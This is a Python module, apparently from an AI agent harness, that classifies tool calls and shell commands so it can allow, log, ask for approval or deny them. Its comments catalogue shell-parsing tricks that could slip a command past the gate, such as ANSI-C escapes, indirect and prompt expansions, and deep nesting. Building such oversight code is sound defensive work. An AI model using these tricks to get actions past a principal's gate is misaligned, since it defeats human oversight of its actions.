"""Action gate: classify a tool call, then decide allow, log, ask or deny.

Two pure steps and one loader:

    c = classify({"tool": "terminal", "args": {"command": "gh pr comment 3 --body hi"}})
    d = decide(c, policies)          # Decision(outcome="ask", reason=..., violations=[...])
    policies = load_policies(store_root)

`classify` looks only at the tool name and its arguments. It places the action on four axes
(reversibility, exposure, cost, third-party effect) and gives it a category. `decide` maps the
cell through the principal's policies (gates matrix, scopes, category overrides, rules,
reserved and denied actions, budget, posting checks) and an operator floor that the principal
policy cannot lower: an irreversible public act that touches a third party always asks.

Approvals (D-033, docs/GATE.md): `approval_binding` hashes the exact outbound text, target and
arguments of an outward act, so an edit voids an approval; `approvers_for` reads who may answer
from `policies/approvals.yaml`. Posts to public targets also pass `check_scrub`, which looks for
internal names, home paths, model ids and internal ids.

Nothing here names a principal. Every value that belongs to one person lives in their store
under `policies/`. Stdlib only; the YAML reader is a small subset parser (see `parse_yaml`).
"""
from __future__ import annotations

import bisect
from collections import Counter
import contextvars
import copy
import fnmatch
import functools
import hashlib
import itertools
import json
import os
import re
import shlex
from dataclasses import asdict, dataclass, field, replace
from pathlib import Path
from types import EllipsisType
from typing import Any, Callable, Iterable, Iterator, Mapping, TypeVar, cast
from urllib.parse import unquote, urlparse

REVERSIBILITY = ("reversible", "costly", "irreversible")
EXPOSURE = ("private", "internal", "public")
OUTCOMES = ("allow", "log", "ask", "deny")
# Policy files may use the words from gates.yaml (act, report) or the outcome names.
_OUTCOME_ALIASES = {"act": "allow", "allow": "allow", "report": "log", "log": "log",
                    "ask": "ask", "deny": "deny", "block": "deny"}

# category -> (reversibility, exposure, third_party). The table is the default cell for each
# kind of action; classify() may adjust exposure from the target, decide() from scopes.
CATEGORIES: dict[str, tuple[str, str, bool]] = {
    "read":              ("reversible", "private", False),
    "local_write":       ("reversible", "private", False),
    "shell":             ("reversible", "private", False),
    "code":              ("reversible", "private", False),
    "generate":          ("reversible", "private", False),
    "delegate":          ("reversible", "private", False),
    "web_read":          ("reversible", "private", False),
    "reaction":          ("reversible", "internal", False),
    "peer_message":      ("reversible", "internal", False),  # D-026: the receiving seat gates it, not the sender
    "schedule":          ("costly", "private", False),
    "credentials":       ("costly", "private", False),
    "browser":           ("costly", "internal", False),
    "remote_write":      ("costly", "internal", False),
    "vcs_push":          ("costly", "internal", False),
    "vcs_merge":         ("costly", "internal", False),
    "vcs_admin":         ("costly", "internal", False),
    "deploy_preview":    ("costly", "internal", False),
    "deploy_production": ("costly", "public", True),
    "github_post":       ("costly", "public", True),
    "github_close":      ("costly", "public", True),
    "history_rewrite":   ("irreversible", "private", False),
    "delete":            ("irreversible", "private", False),
    "force_push":        ("irreversible", "internal", False),
    "publish":           ("irreversible", "public", True),
    "web_post":          ("irreversible", "public", True),
    "message_send":      ("irreversible", "public", True),
    "email_send":        ("irreversible", "public", True),
    "social_post":       ("irreversible", "public", True),
    "payment":           ("irreversible", "public", True),
    "account":           ("irreversible", "public", True),
    "unknown":           ("costly", "private", False),
    # D-038: code the gate cannot see into (a script, an interpreter, a variable in program position, an
    # unknown program) asks; a write to the Exo store asks the principal every time and is never granted.
    "opaque_exec":       ("costly", "private", False),
    "store_write":       ("costly", "private", False),
}

# Categories no standing grant covers and only the principal answers (D-033 terms, every time).
PRINCIPAL_ONLY = ("store_write",)
NO_GRANT = ("credentials", "store_write")

# Categories whose outbound text is checked against the posting rules by default.
OUTBOUND = ("github_post", "message_send", "email_send", "social_post", "web_post", "publish")
# Categories the posting rules apply to unless the policy says otherwise (human-readable posts;
# raw API payloads of web_post are left out because a footer check on JSON is noise).
POSTING_DEFAULT = ("github_post", "message_send", "email_send", "social_post")
# The most posting violations a decision lists when other posts on the line add theirs (#396). The rest are counted.
_LISTED_VIOLATIONS = 20
_LISTED_WITH_COPIES = 200   # per reading, the entries of posts with copies and of their copies, beside the twenty (#439)


class PolicyError(ValueError):
    pass


# --- data ----------------------------------------------------------------------------------

@dataclass
class Classification:
    category: str
    reversibility: str
    exposure: str
    third_party: bool
    cost: float | None = 0.0          # None = a spend of unknown size
    tool: str = ""
    summary: str = ""                 # one line, human readable
    target: str = ""                  # repo, host, chat target or path the action lands on
    link: str = ""                    # URL or path the principal can open
    text: str = ""                    # outbound body text, if any
    title: str = ""                   # outbound title, if any
    text_file: str = ""               # body read from a file (the caller may load it)
    command: str = ""                 # shell command text, if any
    signals: list[str] = field(default_factory=list)
    # The simple commands a compound line was built from (D-075). `decide` checks reserved and deny
    # entries against each of them, so a denied action cannot ride along with a more severe one.
    parts: list["Classification"] = field(default_factory=list, repr=False, compare=False)
    _command_views: list[str] = field(default_factory=list, repr=False, compare=False)
    # Other targets the gate cannot rule out for the same action (#399): `decide` decides the line on each and the
    # strictest decision stands. A copy of the action on each is also a part, so a deny or reserved entry sees it.
    alt_targets: list[str] = field(default_factory=list, repr=False)
    # The line read with the third word of each gh command for its subcommand, as the gate read it before #399, when
    # gh finds a subcommand past the options before it (_gh_verb_order) or reads gh api's method otherwise
    # (_gh_api_method). `decide` keeps the stricter of the two. The call as read before #491, when the gate reads
    # what a sudo -s or -i shell runs, ends the chain of floors (readings).
    floor: "Classification | None" = field(default=None, repr=False, compare=False)
    # True on the copy of a gh action on one of its alt_targets among the parts (#399): an ssh or mosh hop gives an
    # empty one the host, and `fill_body` gives each the body a caller read from the post's body file.
    alt_copy: bool = field(default=False, repr=False, compare=False)
    # True on the copy of a secret line's heaviest other command that _shell_call adds beside the folder's read (#320):
    # on main that command is the line, whose own violations are listed outside the cap, so the copy's are too.
    line_copy: bool = field(default=False, repr=False, compare=False)
    # True on the credentials part for each store a secret line names past its first (#609 follow-up): it only adds
    # a target for `target:` entries to match, so the checks that ask which part read the line on main pass it over.
    other_store: bool = field(default=False, repr=False, compare=False)
    # The source text of the one simple command this part stands for, with its redirections (#394): a rule that
    # would lower a compound line must match it too (_line_own_test). None where no such text exists (a part the
    # gate made up, an unread nest, a string literal in code), and then no such rule matches.
    own: str | None = field(default=None, repr=False, compare=False)
    # The own text of each command on this line that changes the shell for the commands after it (_sets_state): a
    # rule that would lower the line must match each of them too (#394). None stands for a function definition.
    setters: list[str | None] = field(default_factory=list, repr=False, compare=False)
    # A part that runs the stdin of its line, which a command around that line may give (_runs_stdin, _given_stdin).
    inherits: bool = field(default=False, repr=False, compare=False)
    # The signals this part carried before _combine gave it every part's (#396), so the posting checks can tell its
    # own unseen body from another post's. None for a part never combined: its signals are then its own.
    own_signals: list[str] | None = field(default=None, repr=False, compare=False)
    # The same call read with each quoted prefix assignment as the program, as before #471, when the call has one
    # (classify): decide decides that reading too and keeps the stricter.
    before: "Classification | None" = field(default=None, repr=False, compare=False)
    # The same call as the gate read it before #311, where a shell call's own folder argument made it credentials as
    # a whole (#209), and last, on a line also read with a `$` form's backslash-newline joined, the less severe of that
    # reading and the line as written (#584). decide takes every reading and the strictest outcome stands.
    also: "Classification | None" = field(default=None, repr=False, compare=False)
    # The same call read with the lexer as before #143 (_flat_words), where its reading of a ${..} word or a $(( may
    # differ (_classify_reading): the reading that ends the ``also`` chain above, named here so the exo-gate hook's
    # bypass floor takes main's own reading of the call first, as main does. None where it was not made.
    flat: "Classification | None" = field(default=None, repr=False, compare=False)
    # The part a sudo command's write took the lead from (#454). decide() also reads the line with that part leading,
    # as before, and keeps the stricter outcome. None on any other result.
    displaced: "Classification | None" = field(default=None, repr=False, compare=False)
    # The same call as the gate read it before D-074 (#125), with the Exo home's config.json an ordinary file, when
    # that file or an exo command that writes it counted as the store. decide takes both readings and the stricter
    # outcome stands, so a line main denied or asked about never decides lower.
    ordinary: "Classification | None" = field(default=None, repr=False, compare=False)
    # The same call with each `env -S` text read as before (#591 follow-up to #634): a shell line only, as before #634,
    # where the call's first reading also read the line env runs (_env_split_lines); and with #634's reading of its
    # leading words (_env_split_argv), as main read it, first. decide takes every reading and the strictest stands.
    split_readings: list["Classification"] = field(default_factory=list, repr=False, compare=False)

    def as_dict(self) -> dict:
        """Ledger-safe view: no outbound text or command, only their digests and sizes."""
        d = asdict(self)
        d.pop("parts", None)
        d.pop("displaced")
        d.pop("ordinary")
        d.pop("split_readings")
        d.pop("floor")
        d.pop("alt_copy")
        d.pop("line_copy")
        d.pop("other_store")
        d.pop("_command_views")
        d.pop("own")
        d.pop("setters")
        d.pop("inherits")
        d.pop("own_signals")
        d.pop("before")
        d.pop("also")
        d.pop("flat")
        if d["alt_targets"]:
            d["alt_targets"] = [redact_userinfo(t) for t in d["alt_targets"]]
        else:
            d.pop("alt_targets")
        for k in ("text", "title", "command"):
            v = d.pop(k)
            if v:
                d[k + "_sha256"] = hashlib.sha256(v.encode("utf-8")).hexdigest()
                d[k + "_chars"] = len(v)
        return d


@dataclass
class Decision:
    outcome: str
    reason: str
    rule: str = ""                    # which step produced the outcome
    violations: list[str] = field(default_factory=list)
    exposure: str = ""                # effective exposure after scopes
    third_party: bool = False
    # (category, target) of each part a reserved entry matched, once each (D-075). A standing grant for the
    # line's own category must not cover a reserved part outside it, so the targets stay as written here.
    reserved: list[tuple[str, str]] = field(default_factory=list)
    # A sudo write line read with its displaced part leading asks or denies (#454): the approval is then about that
    # part too, so it binds to the exact line (binds_exact) and its approvers are those of both categories.
    displaced_asks: bool = field(default=False, compare=False)
    # The other posts' violations `and N more on other posts` counts, so a merge of a line's readings counts each
    # entry one of them left out (#439 round 13). Not in the ledger view: the count stands for them there.
    hidden: list[str] = field(default_factory=list, repr=False, compare=False)

    def as_dict(self) -> dict:
        """Ledger view: reserved targets with URL userinfo redacted."""
        d = asdict(self)
        d.pop("displaced_asks")
        d.pop("hidden")
        d["reserved"] = list(dict.fromkeys((cat, redact_userinfo(t)) for cat, t in self.reserved))
        return d


# --- helpers -------------------------------------------------------------------------------

def _make(category: str, tool: str = "", **kw) -> Classification:
    rev, exp, third = CATEGORIES.get(category, CATEGORIES["unknown"])
    kw.setdefault("reversibility", rev)
    kw.setdefault("exposure", exp)
    kw.setdefault("third_party", third)
    if "own" not in kw:
        slot = _own_text.get()
        kw["own"] = slot[0] if slot else None
    return Classification(category=category, tool=tool, **kw)


# The text of the simple command being classified (#394), in a one-item list per line that classify_shell sets: every
# part made for that command carries it (Classification.own), the parts of a nested line their own command's text.
# _classify_shell fills the slot for each simple command and empties it for the rest. None outside a shell line.
_own_text: contextvars.ContextVar[list[str | None] | None] = contextvars.ContextVar("exo_gate_own_text", default=None)
# #471: True while classify reads a call as before #471, each quoted prefix assignment as the program
# (_strip_prefix_words); and the one-item list classify sets for the first reading, which notes that a quoted one was
# read as an assignment.
_as_before: contextvars.ContextVar[bool] = contextvars.ContextVar("exo_gate_as_before", default=False)
_quoted_seen: contextvars.ContextVar[list[bool] | None] = contextvars.ContextVar("exo_gate_quoted_seen", default=None)


class _StandIn(str):
    """An own text that stands for another (#394). No text of a line is one, so it is told apart by identity."""


# The own text that a stdin reader's parts carry while _once reads a text once for all the readers on a line (#394).
# Each reader then gets copies with its own text in its place (_restamp).
_READER = _StandIn("the reader's own text")


def _severity(c: Classification) -> tuple:
    return (REVERSIBILITY.index(c.reversibility), EXPOSURE.index(c.exposure), c.third_party,
            c.category not in ("shell", "read", "code", "unknown"))


def _most_severe(cs: Iterable[Classification]) -> Classification | None:
    cs = list(cs)
    return max(cs, key=_severity) if cs else None


_LOCAL_HOSTS = ("localhost", "127.0.0.1", "0.0.0.0", "::1", "[::1]")


_USERINFO = re.compile(r"(?<=://)[^/\s?#]+@")


def redact_userinfo(s: str) -> str:
    """``s`` with the user and password of any URL in it replaced by ``***``, for text that reaches the ledger."""
    return _USERINFO.sub("***@", s or "")


# The ssh options the gate read with their value before D-075 (ssh's own are _SSH_VALUE_OPTS). With any other
# option, the gate took the value for the host.
_SSH_VALUE_OPTS_READ = ("-i", "-p", "-l", "-o", "-F", "-J", "-L", "-R", "-D", "-W", "-b", "-c", "-E", "-m", "-O", "-Q",
                        "-S", "-w", "-e", "-I")
# mosh's options as mosh.pl gives them to Perl's Getopt::Long: each name (the negated forms of `!` options too)
# with its option and whether it takes a value. `client`, `server` and `ssh` name a command mosh runs.
_MOSH_OPTS: dict[str, tuple[str, bool]] = {
    **{n: (n, True) for n in ("client", "server", "ssh", "predict", "port", "p", "family", "bind-server",
                              "experimental-remote-ip")},
    **{n: (n, False) for n in ("a", "n", "4", "6", "local", "help", "version")},
    **{neg + n: (opt, False) for opt, names in (("predict-overwrite", ("predict-overwrite", "o")), ("ssh-pty", ("ssh-pty",)),
                                                ("init", ("init",)), ("fake-proxy", ("fake-proxy",)))
       for n in names for neg in ("", "no", "no-")},
}


def _mosh_args(rest: list[str]) -> tuple[list[str], list[tuple[str, str]], str]:
    """mosh's arguments as Getopt::Long reads them in its default mode: the host and command words, each
    option with its value, and the first word that names no single option ('' if none).

    An option starts with `--`, `-` or `+`, in any case, and may be a unique prefix of a name; its value follows
    `=` or is the next word, and options may follow the host. `--` ends the options. From a word that names no
    single option (mosh stops there) on, the words are read as the host and command, the word itself as well
    once a host is read."""
    words: list[str] = []
    opts: list[tuple[str, str]] = []
    i = 0
    while i < len(rest):
        w = rest[i]
        i += 1
        if w == "--":
            words += rest[i:]
            break
        m = re.match(r"(--|-|\+)(.*)", w, re.S)
        if not m or w == "-":
            words.append(w)
            continue
        name, val = m.group(2), None
        if (eq := name.find("=", 1)) > 0:
            name, val = name[:eq], name[eq + 1:]
        key = name.lower()
        hits = {_MOSH_OPTS[key]} if key in _MOSH_OPTS else {o for n, o in _MOSH_OPTS.items() if n.startswith(key)}
        opt, valued = next(iter(hits)) if len(hits) == 1 else ("", False)
        if valued and val is None and i < len(rest):
            val, i = rest[i], i + 1
        elif valued and val == "":
            opt = ""                  # `--server=` is an error; `--server ''` is not
        if not opt or (val is None) == valued:
            words += rest[i - 1 if words else i:]
            return words, opts, w
        opts.append((opt, val or ""))
    return words, opts, ""


def _ssh_host(dest: str) -> str:
    """The host an ssh destination names: `user@host`, `ssh://user@host:2222` and `[::1]:22` give the host alone."""
    if dest.startswith("ssh://"):
        dest = dest[len("ssh://"):].split("/", 1)[0]
    dest = dest.rpartition("@")[2]
    if dest.startswith("["):
        return dest[1:].partition("]")[0]
    return dest.rsplit(":", 1)[0] if dest.count(":") == 1 else dest


def _host_of(url: str) -> str:
    if "://" not in url:
        url = "http://" + url
    try:
        return (urlparse(url).hostname or "").lower()
    except ValueError:
        return ""


def _is_local_host(host: str) -> bool:
    return host in _LOCAL_HOSTS or host.endswith(".local") or host.endswith(".localhost") or host == ""


def _first(args: Mapping, keys: Iterable[str]) -> str:
    for k in keys:
        v = args.get(k)
        if isinstance(v, (str, int, float)) and str(v).strip():
            return str(v)
    return ""


_TEXT_KEYS = ("body", "text", "message", "content", "comment", "caption", "status", "markdown")
_TITLE_KEYS = ("title", "subject")
_TARGET_KEYS = ("url", "repo", "repository", "to", "recipient", "recipients", "target", "channel",
                "chat_id", "channel_id", "thread", "path", "file_path", "project")
_AMOUNT_KEYS = ("amount", "price", "total", "cost", "value")


# --- shell parsing (D-038) -----------------------------------------------------------------
#
# The shell classifier is an allowlist. A small lexer turns a command line into simple commands
# (words, redirections, heredocs) and records every command substitution it meets. Each simple
# command has one program position. A command is `allow` only when every program in it is a known
# program with no indirection. A program the gate cannot see (a variable, command output, a script
# file, an interpreter, a function, an unknown binary) is `opaque_exec`, which asks. Where the gate
# can see inside (a `bash -c` string, a heredoc fed to a shell, `python -c` code, a `$( )`) it
# classifies the inner text too, and the result keeps the stricter of the two.

_DEPTH = 4
# How many levels of $( ), <( ) and $(( )) one lexer reads inside one another (#334). Each $( ) is listed at every
# level above it and classified there again, so the work for a nest grows with its depth, and classify runs inside
# the gate hook. A deeper part is not read: _nest_end finds where it ends, and it stands as _TOO_DEEP, an unread
# part that asks, also in an exported value. No hand-written command comes near this.
_NEST = 16
# A part that only bash's reading of #143 opens (a $( ), <( ), >( ), backquote or arithmetic $(( in a ${..} word, a
# $(( read as a subshell, single-quoted text bash expands, bash 5.3's ${ cmd; }) is read _WORD_NEST + 1 levels deep:
# its first $( or backquote is level 1, and the _NEST cap stands _WORD_NEST levels below that (_Lexer._part). The
# reading before reads no such nest, and costs next to nothing on it, so bash's reading of one stays a short nest; a
# deeper level is not read and asks.
_WORD_NEST = 2
# How many such parts one classify call opens (_Lexer._part), in classify order: a part counts once for each lexer
# pass that opens it (the line's, each $( ) level around it, _dollar_brace and _unknown_forms), and inner levels are
# opened when their source is classified, after the rest of the line. A part past them is cut as a part past the cap
# is, an unread part that asks. So a line of many such parts costs a small multiple of the reading before.
_WORD_PARTS = 24
_TOO_DEEP = "__exo_gate_nested_too_deep__"
_STAND_INS = re.compile(r"(?:__exo_gate_nested_too_deep__(?:\n|\Z))+")   # a run of stand-in lines (_classify_shell)
# A part of a line that runs a value the gate does not see, or that bash rejects (#143, #553, #554): `${!name}`,
# `${name@P}`, a ${..} word or a $(( bash never closes. The lexer lists it with the substitution sources, and it is an
# opaque part that asks (_classify_shell).
_ODD_WORD = "__exo_gate_unread_word__"
_FUNSUB = re.compile(r"\$\{[ \t\n|]")       # bash 5.3's `${ cmd; }` and `${| cmd; }`
# The start of a ${..} word that runs a value: an indirect one (`${!name}`, `${!1}`, `${!@}`, `${!*}`: the value is
# read as a name, and `a[$(..)]` in it runs), but not a listing (`${!prefix*}`, `${!prefix@}`, `${!arr[@]}`,
# `${!arr[*]}`); or a prompt expansion, whose `$( )` runs (`${name@P}`, `${arr[0]@P}`, `${@@P}`, `${*@P}`, `${@:2@P}`).
# A subscript or offset is read only up to a bracket or brace, so a long run of `${a[` costs one step each.
_RUNS_VALUE = re.compile(r"!(?![A-Za-z_]\w*(?:[*@]|\[[*@]\])\})(?:[A-Za-z_]\w*|\d+|[@*])"
                         r"|(?:(?:[A-Za-z_]\w*|\d+)(?:\[[^\][{}]*\])?|[@*](?::[^\][{}]*)?)@P\}")
_WRITE_REDIRS = (">", ">>", ">|", "&>", "&>>", "<>", ">&")
_REDIR_OPS = ("&>>", "&>", "<<<", "<<-", "<<", "<>", ">>", ">|", ">&", "<&", ">", "<")
_CTRL_OPS = (";;&", ";;", ";&", "&&", "||", "|&", "|", "&", ";", "(", ")")
_ASSIGN = re.compile(r"[A-Za-z_]\w*(\[[^\]]*\])?\+?=.*", re.S)
_ASSIGN_HEAD = re.compile(r"[A-Za-z_]\w*(\[[^\]]*\])?\+?=")   # its NAME= as written in the source, unquoted
# `name()` is looked for only where a word starts, so a long word is not rescanned from each character
_FUNC_NAMES = re.compile(r"\bfunction\s+([^\s(){};&|<>]+)|(?<![^\s(){};&|<>'\"])([^\s(){};&|<>'\"]+)\s*\(\s*\)")
_ANSI_C = re.compile(rb"\\(?:([abeEfnrtv\\'\"?])|([0-7]{1,3})|x\{([0-9A-Fa-f]*)\}?|x([0-9A-Fa-f]{1,2})"
                     rb"|u([0-9A-Fa-f]{1,4})|U([0-9A-Fa-f]{1,8})|c(\\\\?|.))", re.S)


def _ansi_c(raw: str) -> str:
    """The text bash 5.2 makes of a $'..' body in a UTF-8 locale (#167). Octal and \\x values keep their
    low 8 bits, an escape bash does not know keeps its backslash, and a NUL ends the text. A \\u or \\U
    value is written as bash's u32toutf8 writes it: UTF-8 of up to six bytes, surrogates included, and
    nothing at all from 0x80000000 on (so `--forc\\UFFFFFFFFe` is `--force`)."""

    def one(m: re.Match) -> bytes:
        char, octal, brace, hexa, u, big, ctl = m.groups()
        if char:
            return bytes([dict(zip(b"abeEfnrtv", b"\a\b\x1b\x1b\f\n\r\t\v")).get(char[0], char[0])])
        if u or big:
            v = int(u or big, 16)
            if v < 0x80 or v >= 0x80000000:
                return bytes([v]) if v < 0x80 else b""
            n = next(k for k, top in ((2, 0x800), (3, 0x10000), (4, 0x200000), (5, 0x4000000), (6, 0x80000000))
                     if v < top)
            lead = (0xFF00 >> n) & 0xFF | v >> 6 * (n - 1)
            return bytes([lead] + [v >> 6 * k & 0x3F | 0x80 for k in range(n - 2, -1, -1)])
        if ctl:                                # \c\\ takes the escaped backslash as its character
            return b"\x7f" if ctl == b"?" else bytes([ctl[0] & 0x1F])
        return bytes([(int(octal, 8) if octal else int(hexa or brace or b"0", 16)) & 0xFF])

    out = _ANSI_C.sub(one, raw.encode("utf-8", "surrogatepass")).split(b"\0", 1)[0]
    # Bytes that are not UTF-8 (\xff, \377) read as Latin-1 characters.
    return re.sub("[\udc80-\udcff]", lambda b: chr(ord(b.group()) - 0xDC00), out.decode("utf-8", "surrogateescape"))


@dataclass
class _Word:
    text: str = ""
    dynamic: bool = False      # holds $var, ${..}, $(..) or `..` outside single quotes
    quoted: bool = False
    glob: bool = False         # an unquoted * or ?, or a [ or { after the first character
    brace: bool = False        # an unquoted {
    started: bool = False
    raw: str = ""              # the source text of the word, quotes kept
    locale: bool = False       # holds $".." (bash may swap in a translation and expand it)
    redir_after: bool = False  # a redirection, heredoc or here-string follows it before the next word (#207)
    dollar_quote: bool = False  # holds $'..' or $".." (dash and ash keep the $ and the quotes' contents)
    split: bool = False        # bash may make several words of it, or none: an expansion outside "..", or "$@" (#399)
    legacy: bool = False       # holds bash's legacy arithmetic `$[ ]`, which main read as plain text (#588)
    exps: list = field(default_factory=list)  # (scan text, source, ${ frames) per ${..} and $((..)) bash expands
    prompt: list = field(default_factory=list)  # the parameter of each `${..@P}` in it, whose value bash runs (#579)
    fd: str = ""               # a redirection target: the descriptor number written before its operator (`3< f`)


@dataclass
class _Heredoc:
    delim: str
    strip: bool
    quoted: bool
    ambiguous: bool = False    # delimiter spelled with $'..' or $"..": bash and dash end the body on different lines
    body: str = ""
    prompt: list = field(default_factory=list)  # the `${..@P}` of the body, which expand as the body is made (#579)
    fd: str = ""               # the descriptor number before `<<` (`3<<EOF`); "" or 0 is stdin (#208)
    cut: str = ""              # the delimiter as the levels around read it, when it holds a part not read (#334)


@dataclass
class _Cmd:
    words: list = field(default_factory=list)
    redirs: list = field(default_factory=list)       # (operator, _Word)
    heredocs: list = field(default_factory=list)     # _Heredoc
    herestrings: list = field(default_factory=list)  # _Word
    piped_in: bool = False
    operands: list = field(default_factory=list)     # _Word after an unquoted NAME=(..): more of its operands
    piped_group: bool = False    # piped from a compound (`( .. )`, `{ ..; }`, a loop), not from one simple command
    own: str | None = None       # its source text with its redirections, after leading reserved words (#394)
    pipe_src: Callable[[], str | None] | None = None   # piped from simple commands: the pipeline text up to it
    fed: bool = False            # its stdin comes from a compound around it or piped into it (_feed_compound)
    subs_met: int = 0            # how many of the line's subs lie in its text and before it, in the lexer's order (#465)
    opens: tuple | None = None   # on a compound's closer: (the compound's first command, the subs met before the
                                 # closer's redirections), which bash expands before the compound runs (#465)
    stdin_unknown: bool = False  # a stdin the gate cannot read reaches it: a compound's feed or its wrapper's (#316)
    stdin_apart: bool = False    # a wrapper runs it with the wrapper's stdin, which is not its line's (#316)
    arith_for: int = -1          # on a `{` right after a `for ((..))` header: the command that holds that `for` (#479)


class _OutSub(str):
    """The source of a >( ). Its commands are fed what the command around it writes, a stdin the gate cannot read
    (#316). It stays in the line's substitution sources with the others, so every reader of them still reads it, and
    is told apart by its type: only _classify_sub reads it as fed."""


class _Lexer:
    """Shell words, operators, redirections and heredocs. Never raises; odd input gives odd words."""

    def __init__(self, src: str, scan: bool = True, nest: int = 0):
        self.s = src
        self.i = 0
        self.subs: list[str] = []          # sources of $( ), ` `, <( ) and >( ) (an _OutSub) met at this level
        self.pending: list[_Heredoc] = []
        self.scan = scan                   # record _Word.exps, which only _parse's words are read for (_hidden_sets)
        self.covered = 0                   # the source before here lies in a ${..} already recorded
        self.nest = nest                   # $( ), <( ) and $(( )) levels open around here (_NEST)
        self.cuts: list[tuple[int, int, str]] = []   # (start, end, stand-in) of each part not read, in order
        self.marks: list[tuple[int, int]] = []        # the last run's token spans, one per token, with scan (#394)
        self.met: list[int] = []           # per mark, how many subs the line met by the end of its token (#465)
        self.bash = not _flat_words.get()  # ${..} words and $(( as bash's parser reads them (#143, _param, _arith)
        self.differs = False               # that reading may differ from the one before #143 here (_two_ways)
        self.left_open = False             # the text ends inside a quote
        self.brace_at = -1                 # _param_open's last first } found
        self.odd = False                   # _ODD_WORD is listed
        self.ends: dict[int, int] = {}     # _arith_end's, shared with the lexers that read a part of this text
        self.ran_out = False               # a run(closer=True) reached the end of the text before its `)`
        self.part = False                  # it reads a part only bash's reading opens: a backquote is a level too

    def _deeper(self) -> int:
        """The level of the text inside a part only bash's reading opens, whose own $( or backquote is level 1 of
        _WORD_NEST + 1: _WORD_NEST levels from the _NEST cap at most."""
        return max(self.nest + 1, _NEST - _WORD_NEST)

    def _part(self, s: str, nest: int, spend: bool = True) -> _Lexer | None:
        """A lexer at level ``nest`` for a part only bash's reading opens (#143), or None when the part lies past the
        _NEST cap or past what is left of the call's _WORD_PARTS (``spend``), and is cut as a part past the cap is.
        The reading before reads no such part, so it is kept (_differ). A lexer for words alone opens none."""
        if nest > _NEST or _words_only.get():
            self._differ()
            return None
        memo = _call_memo.get()
        if spend:
            self._differ()
            left = [1] if memo is None else memo.setdefault("word_parts", [_WORD_PARTS])
            left[0] -= 1
            if left[0] < 0:
                return None
        lx = _Lexer(s, scan=False, nest=nest)
        lx.part = True
        if s is self.s:
            lx.ends = self.ends
        return lx

    def _odd(self) -> None:
        """List _ODD_WORD among the sources, once: each odd part of a text is the same part."""
        if not self.odd:
            self.odd = True
            self.subs.append(_ODD_WORD)
        self._differ()

    def _differ(self) -> None:
        self.differs = True
        if (flag := _two_ways.get()) is not None:
            flag[0] = True

    def _cut(self, w: _Word, a: int) -> None:
        """The $( ) or <( ) at s[a] lies past _NEST levels and is not read. The line lists _TOO_DEEP for it, and the
        sources of the levels around it hold a short stand-in, so its text is not read again. The word's text is
        what the lexer would give it. A here-doc from before it whose body lies inside gets its body, read as at the
        cap (a $( ) in it is not read either), and the stand-in ends that body with an empty one, so a level read
        again does not take the lines after the part for the body."""
        s = self.s
        b, read = _nest_end(s, a + 2, [] if self.bash else self.pending)    # with bash, it reads its own (_nested)
        if self.bash and ("<<" in s[a:b] or (self.pending and "\n" in s[a:b])):
            self._differ()                           # the reading before shares the here-docs (_nested)
        elif self.bash and not self.part and _MAY_DIFFER.search(s, a, b + 2):    # (it reads no part)
            flat = _flat_words.set(True)
            try:
                if _nest_end(s, a + 2, [])[0] != b:
                    self._differ()                   # the reading before ends it elsewhere (#143)
            finally:
                _flat_words.reset(flat)
        for hd in read:
            if not hd.quoted:
                sub = _Lexer(hd.body, scan=False, nest=_NEST)
                sub.part = self.part
                sub._dquote(_Word(), until_end=True)
                self.subs += sub.subs
        ends = "".join("\n" + (hd.cut or hd.delim) for hd in read) + "\n" if read else ""
        self.cuts.append((a, b, s[a] + "(" + _TOO_DEEP + ends + ")"))
        self.subs.append(_TOO_DEEP)
        w.text += "<(..)" if s[a] in "<>" else "$(" + s[a + 2:max(a + 2, b - 1)] + ")"
        w.dynamic = w.started = w.split = True       # not read, so it may be outside double quotes
        self.i = b

    def _source(self, a: int, b: int) -> str:
        """s[a:b], with each part not read (_cut, a here-doc body holding one) spelt as its stand-in."""
        if not self.cuts:
            return self.s[a:b]
        k = bisect.bisect_left(self.cuts, (a,))
        if k == len(self.cuts) or self.cuts[k][0] >= b:
            return self.s[a:b]
        out = []
        for x, y, stand_in in self.cuts[k:]:
            if x >= b:
                break
            out += [self.s[a:x], stand_in]
            a = max(a, min(y, b))
        return "".join(out) + self.s[a:b]

    def run(self, closer: bool = False) -> list:
        s, toks = self.s, []
        # where each token starts and ends in s, for a command's own text (#394); only _parse reads them
        marks: list[tuple[int, int]] | None = [] if self.scan else None
        met: list[int] = []
        state = {"w": _Word(), "delim": None}
        depth, start = 0, -1              # start: where the current word's source text begins
        w_at = hd_at = 0                  # where that word starts with its `<(`, and where a here-doc's `<<` does
        fd = ""                           # the fd number of the redirection whose target comes next (`3< f`)

        def mark(a: int, b: int) -> None:
            if marks is not None:
                marks.append((a, b))
                met.append(len(self.subs))

        def flush():
            nonlocal start, fd
            w = state["w"]
            w.raw, start = s[start:self.i], -1
            if w.started:
                w.fd, fd = fd, ""
                if state["delim"] is not None:
                    hd = _Heredoc(w.text, state["delim"], w.quoted, w.dollar_quote)
                    hd.fd = w.fd
                    at = self.i - len(w.raw)
                    if bisect.bisect_left(self.cuts, (at,)) < len(self.cuts):     # it holds a part not read
                        spelt = self._source(at, self.i)   # as the levels around spell it, read as a lexer reads it
                        # from the first level, as the levels around read it ($(cat <<'E') is its text)
                        hd.cut = next((t[1].text for t in _Lexer(spelt, scan=False).run() if t[0] == "w"),
                                      spelt)                # its end line is spelt so too (_read_heredocs)
                    self.pending.append(hd)
                    toks.append(("hd", hd))
                    mark(hd_at, self.i)
                    state["delim"] = None
                else:
                    toks.append(("w", w))
                    mark(w_at, self.i)
            state["w"] = _Word()

        while self.i < len(s):
            w = state["w"]
            if start < 0:
                start = w_at = self.i
            ch, nxt = s[self.i], s[self.i + 1:self.i + 2]
            if ch in " \t" or (ch == "\r" and state["delim"] is None):
                flush()
                self.i += 1
            elif ch == "\n":
                flush()
                toks.append(("op", ";"))
                mark(self.i, self.i + 1)
                self.i += 1
                self._read_heredocs(closer)
            elif ch == "#" and not w.started:
                j = s.find("\n", self.i)
                self.i = len(s) if j < 0 else j
            elif ch == "\\":
                if nxt != "\n":
                    w.text += nxt
                    w.quoted = w.started = True
                self.i += 2
            elif ch == "'":
                j = s.find("'", self.i + 1)
                if j < 0:
                    j, self.left_open = len(s), True
                w.text += s[self.i + 1:j]
                w.quoted = w.started = True
                self.i = j + 1
            elif ch == '"':
                self.i += 1
                self._dquote(w)
            elif ch == "`":
                self._backtick(w)
            elif ch == "$":
                self._dollar(w)
            elif ch in "<>" and nxt == "(" and not w.started:
                self.i += 2
                start = self.i
                if self.nest >= _NEST:
